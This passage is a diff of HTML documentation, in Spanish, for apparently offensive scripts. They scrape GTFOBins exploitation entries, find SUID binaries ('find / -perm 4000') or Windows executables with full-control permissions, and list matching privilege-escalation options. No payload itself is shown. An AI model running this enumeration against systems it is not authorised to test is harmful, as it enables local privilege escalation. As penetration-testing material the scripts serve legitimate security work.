+<span id="cb12-47"><a href="#cb12-47" aria-hidden="true" tabindex="-1"></a>    writer.writerow([<span class="st">&#39;Binary&#39;</span>, <span class="st">&#39;Function Name&#39;</span>, <span class="st">&#39;Function URL&#39;</span>])</span>
+<span id="cb12-48"><a href="#cb12-48" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> entry <span class="kw">in</span> data:</span>
+<span id="cb12-49"><a href="#cb12-49" aria-hidden="true" tabindex="-1"></a>        binary <span class="op">=</span> entry[<span class="st">&#39;binary&#39;</span>]</span>
+<span id="cb12-50"><a href="#cb12-50" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> func <span class="kw">in</span> entry[<span class="st">&#39;functions&#39;</span>]:</span>
+<span id="cb12-51"><a href="#cb12-51" aria-hidden="true" tabindex="-1"></a>            writer.writerow([binary, func[<span class="st">&#39;name&#39;</span>], func[<span class="st">&#39;href&#39;</span>]])</span>
+<span id="cb12-52"><a href="#cb12-52" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-53"><a href="#cb12-53" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="ss">f&quot;Datos guardados en </span><span class="sc">{</span>csv_file<span class="sc">}</span><span class="ss">&quot;</span>)</span></code></pre></div>
+<h2 id="detailed_search.py">2. detailed_search.py</h2>
+<p>Este script lee el archivo CSV generado por scrape_bins.py, extrae
+detalles adicionales de cada función y guarda los datos en un segundo
+archivo CSV.</p>
+<div class="sourceCode" id="cb13"><pre
+class="sourceCode python"><code class="sourceCode python"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> requests</span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> bs4 <span class="im">import</span> BeautifulSoup</span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> csv</span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> urllib.parse <span class="im">import</span> urljoin</span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> time</span>
+<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> os</span>
+<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a><span class="co"># URL base del servidor</span></span>
+<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a>base_url <span class="op">=</span> <span class="st">&quot;https://gtfobins.github.io/&quot;</span></span>
+<span id="cb13-10"><a href="#cb13-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-11"><a href="#cb13-11" aria-hidden="true" tabindex="-1"></a><span class="co"># Nombre del archivo CSV de entrada</span></span>
+<span id="cb13-12"><a href="#cb13-12" aria-hidden="true" tabindex="-1"></a>input_csv <span class="op">=</span> <span class="st">&quot;bin_data.csv&quot;</span></span>
+<span id="cb13-13"><a href="#cb13-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-14"><a href="#cb13-14" aria-hidden="true" tabindex="-1"></a><span class="co"># Nombre del archivo de salida CSV</span></span>
+<span id="cb13-15"><a href="#cb13-15" aria-hidden="true" tabindex="-1"></a>output_csv <span class="op">=</span> <span class="st">&quot;bin_data_relevant.csv&quot;</span></span>
+<span id="cb13-16"><a href="#cb13-16" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-17"><a href="#cb13-17" aria-hidden="true" tabindex="-1"></a><span class="co"># Función para obtener la información relevante de una URL</span></span>
+<span id="cb13-18"><a href="#cb13-18" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> obtener_informacion(url):</span>
+<span id="cb13-19"><a href="#cb13-19" aria-hidden="true" tabindex="-1"></a>    response <span class="op">=</span> requests.get(url)</span>
+<span id="cb13-20"><a href="#cb13-20" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> response.status_code <span class="op">!=</span> <span class="dv">200</span>:</span>
+<span id="cb13-21"><a href="#cb13-21" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="ss">f&quot;Error al obtener la URL: </span><span class="sc">{</span>url<span class="sc">}</span><span class="ss">&quot;</span>)</span>
+<span id="cb13-22"><a href="#cb13-22" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> []</span>
+<span id="cb13-23"><a href="#cb13-23" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb13-24"><a href="#cb13-24" aria-hidden="true" tabindex="-1"></a>    soup <span class="op">=</span> BeautifulSoup(response.text, <span class="st">&#39;html.parser&#39;</span>)</span>
+<span id="cb13-25"><a href="#cb13-25" aria-hidden="true" tabindex="-1"></a>    data <span class="op">=</span> []</span>
+<span id="cb13-26"><a href="#cb13-26" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-27"><a href="#cb13-27" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> section <span class="kw">in</span> soup.find_all(<span class="st">&#39;h2&#39;</span>, class_<span class="op">=</span><span class="st">&#39;function-name&#39;</span>):</span>
+<span id="cb13-28"><a href="#cb13-28" aria-hidden="true" tabindex="-1"></a>        function_name <span class="op">=</span> section.text.strip()</span>
+<span id="cb13-29"><a href="#cb13-29" aria-hidden="true" tabindex="-1"></a>        function_id <span class="op">=</span> section.get(<span class="st">&#39;id&#39;</span>)</span>
+<span id="cb13-30"><a href="#cb13-30" aria-hidden="true" tabindex="-1"></a>        function_url <span class="op">=</span> <span class="ss">f&quot;</span><span class="sc">{</span>url<span class="sc">}</span><span class="ss">#</span><span class="sc">{</span>function_id<span class="sc">}</span><span class="ss">&quot;</span></span>
+<span id="cb13-31"><a href="#cb13-31" aria-hidden="true" tabindex="-1"></a>        description <span class="op">=</span> section.find_next(<span class="st">&#39;p&#39;</span>).text.strip() <span class="cf">if</span> section.find_next(<span class="st">&#39;p&#39;</span>) <span class="cf">else</span> <span class="st">&quot;&quot;</span></span>
+<span id="cb13-32"><a href="#cb13-32" aria-hidden="true" tabindex="-1"></a>        example <span class="op">=</span> section.find_next(<span class="st">&#39;code&#39;</span>).text.strip() <span class="cf">if</span> section.find_next(<span class="st">&#39;code&#39;</span>) <span class="cf">else</span> <span class="st">&quot;&quot;</span></span>
+<span id="cb13-33"><a href="#cb13-33" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-34"><a href="#cb13-34" aria-hidden="true" tabindex="-1"></a>        data.append({</span>
+<span id="cb13-35"><a href="#cb13-35" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;function_name&quot;</span>: function_name,</span>
+<span id="cb13-36"><a href="#cb13-36" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;function_url&quot;</span>: function_url,</span>
+<span id="cb13-37"><a href="#cb13-37" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;description&quot;</span>: description,</span>
+<span id="cb13-38"><a href="#cb13-38" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;example&quot;</span>: example</span>
+<span id="cb13-39"><a href="#cb13-39" aria-hidden="true" tabindex="-1"></a>        })</span>
+<span id="cb13-40"><a href="#cb13-40" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-41"><a href="#cb13-41" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> data</span>
+<span id="cb13-42"><a href="#cb13-42" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-43"><a href="#cb13-43" aria-hidden="true" tabindex="-1"></a><span class="co"># Leer el archivo CSV de entrada</span></span>
+<span id="cb13-44"><a href="#cb13-44" aria-hidden="true" tabindex="-1"></a>binarios_funciones <span class="op">=</span> {}</span>
+<span id="cb13-45"><a href="#cb13-45" aria-hidden="true" tabindex="-1"></a><span class="cf">with</span> <span class="bu">open</span>(input_csv, mode<span class="op">=</span><span class="st">&#39;r&#39;</span>, encoding<span class="op">=</span><span class="st">&#39;utf-8&#39;</span>) <span class="im">as</span> <span class="bu">file</span>:</span>
+<span id="cb13-46"><a href="#cb13-46" aria-hidden="true" tabindex="-1"></a>    reader <span class="op">=</span> csv.DictReader(<span class="bu">file</span>)</span>
+<span id="cb13-47"><a href="#cb13-47" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> row <span class="kw">in</span> reader:</span>
+<span id="cb13-48"><a href="#cb13-48" aria-hidden="true" tabindex="-1"></a>        binary <span class="op">=</span> row[<span class="st">&#39;Binary&#39;</span>]</span>
+<span id="cb13-49"><a href="#cb13-49" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> binary <span class="kw">not</span> <span class="kw">in</span> binarios_funciones:</span>
+<span id="cb13-50"><a href="#cb13-50" aria-hidden="true" tabindex="-1"></a>            binarios_funciones[binary] <span class="op">=</span> row[<span class="st">&#39;Function URL&#39;</span>].split(<span class="st">&#39;#&#39;</span>)[<span class="dv">0</span>]</span>
+<span id="cb13-51"><a href="#cb13-51" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-52"><a href="#cb13-52" aria-hidden="true" tabindex="-1"></a><span class="co"># Verificar si ya existe un archivo de salida y hasta dónde se ha procesado</span></span>
+<span id="cb13-53"><a href="#cb13-53" aria-hidden="true" tabindex="-1"></a>resume <span class="op">=</span> <span class="va">False</span></span>
+<span id="cb13-54"><a href="#cb13-54" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> os.path.exists(output_csv):</span>
+<span id="cb13-55"><a href="#cb13-55" aria-hidden="true" tabindex="-1"></a>    <span class="cf">with</span> <span class="bu">open</span>(output_csv, mode<span class="op">=</span><span class="st">&#39;r&#39;</span>, encoding<span class="op">=</span><span class="st">&#39;utf-8&#39;</span>) <span class="im">as</span> <span class="bu">file</span>:</span>
+<span id="cb13-56"><a href="#cb13-56" aria-hidden="true" tabindex="-1"></a>        reader <span class="op">=</span> csv.reader(<span class="bu">file</span>)</span>
+<span id="cb13-57"><a href="#cb13-57" aria-hidden="true" tabindex="-1"></a>        rows <span class="op">=</span> <span class="bu">list</span>(reader)</span>
+<span id="cb13-58"><a href="#cb13-58" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="bu">len</span>(rows) <span class="op">&gt;</span> <span class="dv">1</span>:</span>
+<span id="cb13-59"><a href="#cb13-59" aria-hidden="true" tabindex="-1"></a>            last_processed <span class="op">=</span> rows[<span class="op">-</span><span class="dv">1</span>][<span class="dv">2</span>]</span>
+<span id="cb13-60"><a href="#cb13-60" aria-hidden="true" tabindex="-1"></a>            resume <span class="op">=</span> <span class="va">True</span></span>
+<span id="cb13-61"><a href="#cb13-61" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-62"><a href="#cb13-62" aria-hidden="true" tabindex="-1"></a><span class="co"># Inicializar una lista para almacenar toda la información</span></span>
+<span id="cb13-63"><a href="#cb13-63" aria-hidden="true" tabindex="-1"></a>informacion_binarios <span class="op">=</span> []</span>
+<span id="cb13-64"><a href="#cb13-64" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-65"><a href="#cb13-65" aria-hidden="true" tabindex="-1"></a><span class="co"># Abrir el archivo CSV para escritura</span></span>
+<span id="cb13-66"><a href="#cb13-66" aria-hidden="true" tabindex="-1"></a>csv_file <span class="op">=</span> <span class="bu">open</span>(output_csv, mode<span class="op">=</span><span class="st">&#39;w&#39;</span>, newline<span class="op">=</span><span class="st">&#39;&#39;</span>, encoding<span class="op">=</span><span class="st">&#39;utf-8&#39;</span>)</span>
+<span id="cb13-67"><a href="#cb13-67" aria-hidden="true" tabindex="-1"></a>csv_writer <span class="op">=</span> csv.writer(csv_file)</span>
+<span id="cb13-68"><a href="#cb13-68" aria-hidden="true" tabindex="-1"></a>csv_writer.writerow([<span class="st">&#39;Binary&#39;</span>, <span class="st">&#39;Function Name&#39;</span>, <span class="st">&#39;Function URL&#39;</span>, <span class="st">&#39;Description&#39;</span>, <span class="st">&#39;Example&#39;</span>])</span>
+<span id="cb13-69"><a href="#cb13-69" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-70"><a href="#cb13-70" aria-hidden="true" tabindex="-1"></a><span class="co"># Recorrer la lista de binarios y sus funciones</span></span>
+<span id="cb13-71"><a href="#cb13-71" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> binary, url <span class="kw">in</span> binarios_funciones.items():</span>
+<span id="cb13-72"><a href="#cb13-72" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Si estamos retomando desde un punto anterior, saltamos hasta el último URL procesado</span></span>
+<span id="cb13-73"><a href="#cb13-73" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> resume:</span>
+<span id="cb13-74"><a href="#cb13-74" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> url <span class="op">!=</span> last_processed:</span>
+<span id="cb13-75"><a href="#cb13-75" aria-hidden="true" tabindex="-1"></a>            <span class="cf">continue</span></span>
+<span id="cb13-76"><a href="#cb13-76" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span>:</span>
+<span id="cb13-77"><a href="#cb13-77" aria-hidden="true" tabindex="-1"></a>            resume <span class="op">=</span> <span class="va">False</span></span>
+<span id="cb13-78"><a href="#cb13-78" aria-hidden="true" tabindex="-1"></a>    full_url <span class="op">=</span> urljoin(base_url, url)</span>
+<span id="cb13-79"><a href="#cb13-79" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb13-80"><a href="#cb13-80" aria-hidden="true" tabindex="-1"></a>    informacion <span class="op">=</span> obtener_informacion(full_url)</span>
+<span id="cb13-81"><a href="#cb13-81" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> item <span class="kw">in</span> informacion:</span>
+<span id="cb13-82"><a href="#cb13-82" aria-hidden="true" tabindex="-1"></a>        informacion_binarios.append({</span>
+<span id="cb13-83"><a href="#cb13-83" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;binary&quot;</span>: binary,</span>
+<span id="cb13-84"><a href="#cb13-84" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;function_name&quot;</span>: item[<span class="st">&quot;function_name&quot;</span>],</span>
+<span id="cb13-85"><a href="#cb13-85" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;function_url&quot;</span>: item[<span class="st">&quot;function_url&quot;</span>],</span>
+<span id="cb13-86"><a href="#cb13-86" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;description&quot;</span>: item[<span class="st">&quot;description&quot;</span>],</span>
+<span id="cb13-87"><a href="#cb13-87" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;example&quot;</span>: item[<span class="st">&quot;example&quot;</span>]</span>
+<span id="cb13-88"><a href="#cb13-88" aria-hidden="true" tabindex="-1"></a>        })</span>
+<span id="cb13-89"><a href="#cb13-89" aria-hidden="true" tabindex="-1"></a>        <span class="co"># Guardar la información en el archivo CSV</span></span>
+<span id="cb13-90"><a href="#cb13-90" aria-hidden="true" tabindex="-1"></a>        csv_writer.writerow([binary, item[<span class="st">&#39;function_name&#39;</span>], item[<span class="st">&#39;function_url&#39;</span>], item[<span class="st">&#39;description&#39;</span>], item[<span class="st">&#39;example&#39;</span>]])</span>
+<span id="cb13-91"><a href="#cb13-91" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="ss">f&quot;[+] Binary: </span><span class="sc">{</span>binary<span class="sc">}</span><span class="ss"> </span><span class="sc">{</span>item[<span class="st">&#39;function_name&#39;</span>]<span class="sc">}</span><span class="ss">&quot;</span>)</span>
+<span id="cb13-92"><a href="#cb13-92" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Hacemos una pausa de 5 segundos entre cada solicitud de URL</span></span>
+<span id="cb13-93"><a href="#cb13-93" aria-hidden="true" tabindex="-1"></a>    time.sleep(<span class="dv">5</span>)</span>
+<span id="cb13-94"><a href="#cb13-94" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-95"><a href="#cb13-95" aria-hidden="true" tabindex="-1"></a><span class="co"># Cerrar el archivo CSV</span></span>
+<span id="cb13-96"><a href="#cb13-96" aria-hidden="true" tabindex="-1"></a>csv_file.close()</span>
+<span id="cb13-97"><a href="#cb13-97" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-98"><a href="#cb13-98" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="ss">f&quot;Datos guardados en </span><span class="sc">{</span>output_csv<span class="sc">}</span><span class="ss">&quot;</span>)</span></code></pre></div>
+<ol start="3" type="1">
+<li>lazyown.py Este script analiza los binarios en el sistema y genera
+opciones basadas en la información recopilada. Detecta si el sistema
+operativo es Linux o Windows y ejecuta el comando adecuado para buscar
+binarios con permisos elevados.</li>
+</ol>
+<div class="sourceCode" id="cb14"><pre
+class="sourceCode python"><code class="sourceCode python"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> pandas <span class="im">as</span> pd</span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> os</span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> subprocess</span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> platform</span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a><span class="co"># Lee los CSVs y crea los DataFrames</span></span>
+<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a>df1 <span class="op">=</span> pd.read_csv(<span class="st">&#39;bin_data.csv&#39;</span>)</span>
+<span id="cb14-8"><a href="#cb14-8" aria-hidden="true" tabindex="-1"></a>df2 <span class="op">=</span> pd.read_csv(<span class="st">&#39;bin_data_relevant.csv&#39;</span>)</span>
+<span id="cb14-9"><a href="#cb14-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-10"><a href="#cb14-10" aria-hidden="true" tabindex="-1"></a><span class="co"># Guarda los DataFrames como Parquet</span></span>
+<span id="cb14-11"><a href="#cb14-11" aria-hidden="true" tabindex="-1"></a>df1.to_parquet(<span class="st">&#39;binarios.parquet&#39;</span>)</span>
+<span id="cb14-12"><a href="#cb14-12" aria-hidden="true" tabindex="-1"></a>df2.to_parquet(<span class="st">&#39;detalles.parquet&#39;</span>)</span>
+<span id="cb14-13"><a href="#cb14-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-14"><a href="#cb14-14" aria-hidden="true" tabindex="-1"></a><span class="co"># Función para realizar la búsqueda y generar el CSV de salida</span></span>
+<span id="cb14-15"><a href="#cb14-15" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> buscar_binarios():</span>
+<span id="cb14-16"><a href="#cb14-16" aria-hidden="true" tabindex="-1"></a>    binarios_encontrados <span class="op">=</span> <span class="bu">set</span>()</span>
+<span id="cb14-17"><a href="#cb14-17" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb14-18"><a href="#cb14-18" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Detecta el sistema operativo</span></span>
+<span id="cb14-19"><a href="#cb14-19" aria-hidden="true" tabindex="-1"></a>    sistema_operativo <span class="op">=</span> platform.system()</span>
+<span id="cb14-20"><a href="#cb14-20" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb14-21"><a href="#cb14-21" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> sistema_operativo <span class="op">==</span> <span class="st">&#39;Linux&#39;</span>:</span>
+<span id="cb14-22"><a href="#cb14-22" aria-hidden="true" tabindex="-1"></a>        <span class="co"># Ejecuta el comando find para Linux</span></span>
+<span id="cb14-23"><a href="#cb14-23" aria-hidden="true" tabindex="-1"></a>        result <span class="op">=</span> subprocess.run([<span class="st">&#39;find&#39;</span>, <span class="st">&#39;/&#39;</span>, <span class="st">&#39;-perm&#39;</span>, <span class="st">&#39;4000&#39;</span>, <span class="st">&#39;-ls&#39;</span>], stdout<span class="op">=</span>subprocess.PIPE, stderr<span class="op">=</span>subprocess.PIPE, text<span class="op">=</span><span class="va">True</span>)</span>
+<span id="cb14-24"><a href="#cb14-24" aria-hidden="true" tabindex="-1"></a>        output <span class="op">=</span> result.stdout</span>
+<span id="cb14-25"><a href="#cb14-25" aria-hidden="true" tabindex="-1"></a>        </span>
+<span id="cb14-26"><a href="#cb14-26" aria-hidden="true" tabindex="-1"></a>        <span class="co"># Extrae los binarios encontrados</span></span>
+<span id="cb14-27"><a href="#cb14-27" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> line <span class="kw">in</span> output.split(<span class="st">&#39;</span><span class="ch">\n</span><span class="st">&#39;</span>):</span>
+<span id="cb14-28"><a href="#cb14-28" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> line:</span>
+<span id="cb14-29"><a href="#cb14-29" aria-hidden="true" tabindex="-1"></a>                binario <span class="op">=</span> os.path.basename(line.split()[<span class="op">-</span><span class="dv">1</span>])</span>
+<span id="cb14-30"><a href="#cb14-30" aria-hidden="true" tabindex="-1"></a>                binarios_encontrados.add(binario)</span>
+<span id="cb14-31"><a href="#cb14-31" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb14-32"><a href="#cb14-32" aria-hidden="true" tabindex="-1"></a>    <span class="cf">elif</span> sistema_operativo <span class="op">==</span> <span class="st">&#39;Windows&#39;</span>:</span>
+<span id="cb14-33"><a href="#cb14-33" aria-hidden="true" tabindex="-1"></a>        <span class="co"># Script de PowerShell para Windows</span></span>
+<span id="cb14-34"><a href="#cb14-34" aria-hidden="true" tabindex="-1"></a>        powershell_script <span class="op">=</span> <span class="st">&quot;&quot;&quot;</span></span>
+<span id="cb14-35"><a href="#cb14-35" aria-hidden="true" tabindex="-1"></a><span class="st">        $directories = @(&quot;C:</span><span class="ch">\\</span><span class="st">Windows</span><span class="ch">\\</span><span class="st">System32&quot;, &quot;C:</span><span class="ch">\\</span><span class="st">&quot;, &quot;C:</span><span class="ch">\\</span><span class="st">Program Files&quot;, &quot;C:</span><span class="ch">\\</span><span class="st">Program Files (x86)&quot;)</span></span>
+<span id="cb14-36"><a href="#cb14-36" aria-hidden="true" tabindex="-1"></a><span class="st">        foreach ($dir in $directories) {</span></span>
+<span id="cb14-37"><a href="#cb14-37" aria-hidden="true" tabindex="-1"></a><span class="st">            Get-ChildItem -Path $dir -Recurse -Filter *.exe -ErrorAction SilentlyContinue | </span></span>
+<span id="cb14-38"><a href="#cb14-38" aria-hidden="true" tabindex="-1"></a><span class="st">            ForEach-Object {</span></span>
+<span id="cb14-39"><a href="#cb14-39" aria-hidden="true" tabindex="-1"></a><span class="st">                $acl = Get-Acl $_.FullName</span></span>
+<span id="cb14-40"><a href="#cb14-40" aria-hidden="true" tabindex="-1"></a><span class="st">                $privileges = $acl.Access | Where-Object { $_.FileSystemRights -match &quot;FullControl&quot; }</span></span>
+<span id="cb14-41"><a href="#cb14-41" aria-hidden="true" tabindex="-1"></a><span class="st">                if ($privileges) {</span></span>
+<span id="cb14-42"><a href="#cb14-42" aria-hidden="true" tabindex="-1"></a><span class="st">                    Write-Output &quot;$($_.FullName)&quot;</span></span>
+<span id="cb14-43"><a href="#cb14-43" aria-hidden="true" tabindex="-1"></a><span class="st">                }</span></span>
+<span id="cb14-44"><a href="#cb14-44" aria-hidden="true" tabindex="-1"></a><span class="st">            }</span></span>
+<span id="cb14-45"><a href="#cb14-45" aria-hidden="true" tabindex="-1"></a><span class="st">        }</span></span>
+<span id="cb14-46"><a href="#cb14-46" aria-hidden="true" tabindex="-1"></a><span class="st">        &quot;&quot;&quot;</span></span>
+<span id="cb14-47"><a href="#cb14-47" aria-hidden="true" tabindex="-1"></a>        </span>
+<span id="cb14-48"><a href="#cb14-48" aria-hidden="true" tabindex="-1"></a>        <span class="co"># Ejecuta el script de PowerShell</span></span>
+<span id="cb14-49"><a href="#cb14-49" aria-hidden="true" tabindex="-1"></a>        result <span class="op">=</span> subprocess.run([<span class="st">&#39;powershell&#39;</span>, <span class="st">&#39;-Command&#39;</span>, powershell_script], stdout<span class="op">=</span>subprocess.PIPE, stderr<span class="op">=</span>subprocess.PIPE, text<span class="op">=</span><span class="va">True</span>)</span>
+<span id="cb14-50"><a href="#cb14-50" aria-hidden="true" tabindex="-1"></a>        output <span class="op">=</span> result.stdout</span>
+<span id="cb14-51"><a href="#cb14-51" aria-hidden="true" tabindex="-1"></a>        </span>
+<span id="cb14-52"><a href="#cb14-52" aria-hidden="true" tabindex="-1"></a>        <span class="co"># Extrae los binarios encontrados</span></span>
+<span id="cb14-53"><a href="#cb14-53" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> line <span class="kw">in</span> output.split(<span class="st">&#39;</span><span class="ch">\n</span><span class="st">&#39;</span>):</span>
+<span id="cb14-54"><a href="#cb14-54" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> line:</span>
+<span id="cb14-55"><a href="#cb14-55" aria-hidden="true" tabindex="-1"></a>                binario <span class="op">=</span> os.path.basename(line.strip())</span>
+<span id="cb14-56"><a href="#cb14-56" aria-hidden="true" tabindex="-1"></a>                binarios_encontrados.add(binario)</span>
+<span id="cb14-57"><a href="#cb14-57" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb14-58"><a href="#cb14-58" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Filtra el DataFrame principal con los binarios encontrados</span></span>
+<span id="cb14-59"><a href="#cb14-59" aria-hidden="true" tabindex="-1"></a>    df_binarios_encontrados <span class="op">=</span> df1[df1[<span class="st">&#39;Binary&#39;</span>].isin(binarios_encontrados)]</span>
+<span id="cb14-60"><a href="#cb14-60" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb14-61"><a href="#cb14-61" aria-hidden="true" tabindex="-1"></a>    <span class="co"># Genera un CSV con los detalles de los binarios encontrados</span></span>
+<span id="cb14-62"><a href="#cb14-62" aria-hidden="true" tabindex="-1"></a>    <span class="cf">with</span> <span class="bu">open</span>(<span class="st">&#39;resultado.csv&#39;</span>, <span class="st">&#39;w&#39;</span>) <span class="im">as</span> f:</span>
+<span id="cb14-63"><a href="#cb14-63" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> binario <span class="kw">in</span> binarios_encontrados:</span>
+<span id="cb14-64"><a href="#cb14-64" aria-hidden="true" tabindex="-1"></a>            detalles <span class="op">=</span> df2[df2[<span class="st">&#39;Binary&#39;</span>] <span class="op">==</span> binario]</span>
+<span id="cb14-65"><a href="#cb14-65" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> <span class="kw">not</span> detalles.empty:</span>
+<span id="cb14-66"><a href="#cb14-66" aria-hidden="true" tabindex="-1"></a>                f.write(detalles.to_csv(index<span class="op">=</span><span class="va">False</span>, header<span class="op">=</span><span class="va">False</span>))</span>
+<span id="cb14-67"><a href="#cb14-67" aria-hidden="true" tabindex="-1"></a>                <span class="bu">print</span>(detalles.to_csv(index<span class="op">=</span><span class="va">False</span>, header<span class="op">=</span><span class="va">False</span>))</span>
+<span id="cb14-68"><a href="#cb14-68" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-69"><a href="#cb14-69" aria-hidden="true" tabindex="-1"></a><span class="co"># Función para ejecutar opciones basadas en los datos encontrados</span></span>
+<span id="cb14-70"><a href="#cb14-70" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> ejecutar_opciones():</span>
+<span id="cb14-71"><a href="#cb14-71" aria-hidden="true" tabindex="-1"></a>    df_resultado <span class="op">=</span> pd.read_csv(<span class="st">&#39;resultado.csv&#39;</span>, header<span class="op">=</span><span class="va">None</span>, names<span class="op">=</span>[<span class="st">&#39;Binary&#39;</span>, <span class="st">&#39;Function Name&#39;</span>, <span class="st">&#39;Function URL&#39;</span>, <span class="st">&#39;Description&#39;</span>, <span class="st">&#39;Example&#39;</span>])</span>
+<span id="cb14-72"><a href="#cb14-72" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb14-73"><a href="#cb14-73" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> binario <span class="kw">in</span> df_resultado[<span class="st">&#39;Binary&#39;</span>].unique():</span>
+<span id="cb14-74"><a href="#cb14-74" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="ss">f&quot;Binario encontrado: </span><span class="sc">{</span>binario<span class="sc">}</span><span class="ss">&quot;</span>)</span>
+<span id="cb14-75"><a href="#cb14-75" aria-hidden="true" tabindex="-1"></a>        detalles <span class="op">=</span> df_resultado[df_resultado[<span class="st">&#39;Binary&#39;</span>] <span class="op">==</span> binario]</span>
+<span id="cb14-76"><a href="#cb14-76" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-77"><a href="#cb14-77" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="st">&quot;Opciones:&quot;</span>)</span>
+<span id="cb14-78"><a href="#cb14-78" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> i, (_, row) <span class="kw">in</span> <span class="bu">enumerate</span>(detalles.iterrows(), start<span class="op">=</span><span class="dv">1</span>):</span>
+<span id="cb14-79"><a href="#cb14-79" aria-hidden="true" tabindex="-1"></a>            <span class="bu">print</span>(<span class="ss">f&quot;</span><span class="sc">{</span>i<span class="sc">}</span><span class="ss">. </span><span class="sc">{</span>row[<span class="st">&#39;Function Name&#39;</span>]<span class="sc">}</span><span class="ss"> - </span><span class="sc">{</span>row[<span class="st">&#39;Description&#39;</span>]<span class="sc">}</span><span class="ss">&quot;</span>)</span>
